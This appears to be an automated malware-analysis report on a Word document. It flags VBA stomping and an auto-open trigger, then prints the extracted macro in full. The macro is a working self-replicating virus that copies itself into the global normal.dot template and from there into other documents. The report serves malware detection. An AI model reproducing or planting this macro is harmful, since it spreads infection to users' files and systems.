behavior.VBA Stomping: VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code
behavior.autoopen: Runs when the Word document is opened

docinfo.macro:
Public Sub MAIN()
Dim a$
Dim b$
Dim c$
Dim b_ As Object
a$ = "autoopen"
b$ = WordBasic.[FileName$]()
c$ = WordBasic.[DefaultDir$](2) + "\normal.dot"
Dim a_ As Object: Set a_ = WordBasic.DialogRecord.Organizer(False)
Set a_ = WordBasic.CurValues.Organizer
a_.Copy = 1
a_.Tab = 3
a_.Name = a$
a_.Source = b$
a_.Destination = c$
On Error Resume Next
WordBasic.Organizer a_
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0
If WordBasic.CountMacros(1) = 0 Then
a_.Source = c$
a_.Destination = b$
WordBasic.Organizer a_
Set b_ = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.ScreenUpdating
WordBasic.DisableAutoMacros
WordBasic.FileOpen c$
Set b_ = WordBasic.CurValues.FileSaveAs
WordBasic.FileClose 2
WordBasic.DisableAutoMacros 0
b_.Name = WordBasic.[FileName$]()
WordBasic.FileSaveAs b_
End If
End Sub
